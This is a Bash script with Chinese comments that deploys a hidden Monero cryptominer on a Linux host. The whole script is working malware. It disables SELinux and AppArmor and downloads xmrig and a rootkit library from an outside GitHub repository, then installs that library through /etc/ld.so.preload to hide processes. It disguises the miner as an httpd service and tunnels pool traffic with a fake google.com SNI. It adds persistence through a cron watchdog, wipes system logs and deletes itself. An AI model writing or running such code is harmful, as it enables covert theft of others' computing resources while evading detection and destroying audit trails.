#!/bin/bash

# 隐藏挖矿进程的一键部署脚本（跳过 stunnel 语法检查，直接启动验证）

if [ "$(id -u)" != "0" ]; then
    echo "此脚本需要 root 权限运行" 1>&2
    exit 1
fi

set -e

# 定义路径和文件
declare -a created_files
declare -a created_dirs
created_dirs=("/opt/httpd-bin" "/etc/systemd/conf.d" "/opt/svc-bin" "/mnt/tmpfs")
svc_conf="/mnt/tmpfs/svc.conf"
svc_conf_enc="/mnt/tmpfs/svc.conf.enc"
stunnel_conf="/etc/stunnel/stunnel.conf"
ld_preload="/etc/ld.so.preload"
svc_service="/etc/systemd/system/svc.service"
tmp_tar="/tmp/svc.tar.gz"
tmp_pid="/tmp/svc.pid"
key_file="/mnt/tmpfs/key"

# GitHub 预编译文件下载链接
wrapper_url="https://github.com/pingyourwifi/monerosh/raw/main/svc-wrapper"
libhide_url="https://github.com/pingyourwifi/monerosh/raw/main/libhide.so"

# 清理函数
cleanup() {
    echo "清理系统中残留的文件和操作..."
    for file in "$tmp_tar" "$tmp_pid" "$svc_conf" "$svc_conf_enc" "$key_file"; do
        [ -f "$file" ] && { shred -u "$file" 2>/dev/null || rm -f "$file" 2>/dev/null; }
    done
    for file in "$stunnel_conf" "$ld_preload" "$svc_service" "/opt/httpd-bin/svc-wrapper" "/opt/svc-bin/libhide.so"; do
        [ -f "$file" ] && { shred -u "$file" 2>/dev/null || rm -f "$file" 2>/dev/null; }
    done
    for dir in "${created_dirs[@]}"; do
        [ -d "$dir" ] && rm -rf "$dir" 2>/dev/null
    done
    mountpoint -q /mnt/tmpfs && umount /mnt/tmpfs 2>/dev/null
    [ -f "/etc/ld.so.preload.bak" ] && mv /etc/ld.so.preload.bak /etc/ld.so.preload 2>/dev/null
    id svc >/dev/null 2>&1 && userdel -r svc 2>/dev/null
    getent group svc >/dev/null && groupdel svc 2>/dev/null
    systemctl is-enabled svc.service >/dev/null 2>&1 && systemctl disable svc.service 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    sed -i '/svc.service/d' /etc/crontab 2>/dev/null
    journalctl --vacuum-time=1s 2>/dev/null || echo "警告：无法清理 journalctl 日志"
    command -v setenforce &> /dev/null && { setenforce 1 || echo "警告：无法恢复 SELinux"; }
    command -v aa-status &> /dev/null && { systemctl start apparmor || echo "警告：无法恢复 AppArmor"; }
    echo "清理完成。"
}

# 捕获错误并清理
trap 'cleanup; exit 1' ERR INT TERM

# 临时禁用系统限制
command -v setenforce &> /dev/null && { echo "检测到 SELinux，临时禁用..."; setenforce 0 || echo "警告：无法禁用 SELinux"; }
command -v aa-status &> /dev/null && { echo "检测到 AppArmor，临时禁用..."; systemctl stop apparmor || echo "警告：无法停止 AppArmor"; }

# 检查并安装必要依赖
echo "检查和安装依赖..."
for cmd in curl tar stunnel4 systemctl shred openssl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "安装缺失的依赖：$cmd"
        apt-get update && apt-get install -y curl tar stunnel4 systemd coreutils openssl || {
            echo "错误：无法安装 $cmd，请手动安装" 1>&2
            exit 1
        }
    fi
done

# 用户输入
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入服务密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}
read -p "请输入挖矿线程数 (默认: 1，最大: $(nproc)): " threads
threads=${threads:-1}
if ! [[ "$threads" =~ ^[0-9]+$ ]] || [ "$threads" -lt 1 ] || [ "$threads" -gt "$(nproc)" ]; then
    echo "错误：线程数必须是 1 到 $(nproc) 之间的整数，使用默认值 1" 1>&2
    threads=1
fi
read -s -p "请输入配置文件加密密码 (默认与服务密码相同): " enc_pass
enc_pass=${enc_pass:-$pool_pass}
echo

# 创建目录
for dir in "${created_dirs[@]}"; do
    mkdir -p "$dir" || { echo "创建目录 $dir 失败" 1>&2; exit 1; }
    chmod 700 "$dir"
done
mount -t tmpfs tmpfs /mnt/tmpfs || { echo "挂载 tmpfs 失败" 1>&2; exit 1; }

# 下载并安装 xmrig
echo "下载并安装 xmrig..."
curl -L --retry 3 https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o "$tmp_tar" || {
    echo "下载 xmrig 失败" 1>&2
    exit 1
}
tar -xzf "$tmp_tar" -C /opt/httpd-bin || { echo "解压失败" 1>&2; exit 1; }
mv /opt/httpd-bin/xmrig-6.22.2/xmrig /opt/httpd-bin/httpd-core || { echo "移动文件失败" 1>&2; exit 1; }
chmod 700 /opt/httpd-bin/httpd-core
rm -rf /opt/httpd-bin/xmrig-6.22.2
shred -u "$tmp_tar" || rm -f "$tmp_tar"

# 下载预编译文件
echo "下载预编译文件..."
curl -L --retry 3 "$wrapper_url" -o /opt/httpd-bin/svc-wrapper || { echo "下载 svc-wrapper 失败" 1>&2; exit 1; }
chmod 700 /opt/httpd-bin/svc-wrapper
curl -L --retry 3 "$libhide_url" -o /opt/svc-bin/libhide.so || { echo "下载 libhide.so 失败" 1>&2; exit 1; }
chmod 700 /opt/svc-bin/libhide.so

# 生成配置文件
cat > "$svc_conf" <<EOF
{
    "pools": [
        {
            "url": "127.0.0.1:8443",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "cpu": {
        "enabled": true,
        "max-threads-hint": 50,
        "priority": 2,
        "threads": $threads
    },
    "print-time": 0,
    "verbose": false,
    "max-cpu-usage": 50,
    "randomx": {
        "1gb-pages": false,
        "cache-qos": true
    }
}
EOF
chmod 600 "$svc_conf"

# 加密配置文件
echo "加密配置文件..."
echo -n "$enc_pass" > "$key_file"
chmod 600 "$key_file"
openssl enc -aes-256-cbc -salt -in "$svc_conf" -out "$svc_conf_enc" -kfile "$key_file" -pbkdf2 || {
    echo "错误：配置文件加密失败" 1>&2
    exit 1
}
shred -u "$svc_conf" || rm -f "$svc_conf"

# 创建 stunnel 配置文件
cat > "$stunnel_conf" <<EOF
[svc]
client = yes
accept = 127.0.0.1:8443
connect = $pool_url
syslog = no
output = /dev/null
sni = www.google.com
ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256
curve = secp384r1
EOF
chmod 600 "$stunnel_conf"

# 跳过 stunnel 语法检查，直接依赖服务启动验证
echo "创建 stunnel 配置文件完成，将在服务启动时验证..."

# 设置全局 LD_PRELOAD
[ -f "$ld_preload" ] && cp "$ld_preload" /etc/ld.so.preload.bak
echo "/opt/svc-bin/libhide.so" > "$ld_preload" || {
    echo "设置 LD_PRELOAD 失败，回滚..." 1>&2
    [ -f /etc/ld.so.preload.bak ] && mv /etc/ld.so.preload.bak "$ld_preload"
    exit 1
}

# 创建用户和组
groupadd -r svc 2>/dev/null || true
useradd -r -s /bin/false -g svc svc 2>/dev/null || { echo "创建用户失败" 1>&2; exit 1; }
chown -R svc:svc /opt/httpd-bin /etc/systemd/conf.d /etc/stunnel /opt/svc-bin /mnt/tmpfs

# 创建启动脚本
cat > /opt/httpd-bin/start.sh <<EOF
#!/bin/bash
openssl enc -aes-256-cbc -d -in "$svc_conf_enc" -out "$svc_conf" -kfile "$key_file" -pbkdf2
/opt/httpd-bin/svc-wrapper --config="$svc_conf"
shred -u "$svc_conf"
EOF
chmod 700 /opt/httpd-bin/start.sh

# 创建 systemd 服务
cat > "$svc_service" <<EOF
[Unit]
Description=Service Daemon
After=network.target stunnel4.service

[Service]
User=svc
Group=svc
ExecStart=/opt/httpd-bin/start.sh
Restart=always
LimitCORE=0
MemoryMax=512M
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
chmod 644 "$svc_service"

# 启用并启动服务
echo "启用并启动服务..."
systemctl enable stunnel4.service || { echo "启用 stunnel 服务失败" 1>&2; exit 1; }
systemctl start stunnel4.service || { echo "启动 stunnel 服务失败，请检查 'systemctl status stunnel4.service'" 1>&2; exit 1; }
systemctl daemon-reload || { echo "systemd 重载失败" 1>&2; exit 1; }
systemctl enable svc.service || { echo "启用 svc 服务失败" 1>&2; exit 1; }
systemctl start svc.service || { echo "启动 svc 服务失败" 1>&2; exit 1; }
echo "*/5 * * * * root systemctl is-active svc.service || systemctl restart svc.service" >> /etc/crontab

# 清理日志和痕迹
journalctl --vacuum-time=1s || echo "警告：无法清理 journalctl 日志"
shred -u /tmp/* /opt/httpd-bin/*.tar.gz 2>/dev/null || rm -f /tmp/* /opt/httpd-bin/*.tar.gz 2>/dev/null
shred -u "$0" || rm -f "$0"

# 检查服务状态
if systemctl is-active svc.service &> /dev/null && systemctl is-active stunnel4.service &> /dev/null; then
    echo "部署完成！服务运行正常，使用 $threads 个线程。"
else
    echo "警告：服务未正确启动，请检查 systemctl status"
    cleanup
    exit 1
fi

# 恢复系统限制
command -v setenforce &> /dev/null && { setenforce 1 || echo "警告：无法恢复 SELinux"; }
command -v aa-status &> /dev/null && { systemctl start apparmor || echo "警告：无法恢复 AppArmor"; }

# 清理 trap
trap - ERR INT TERM
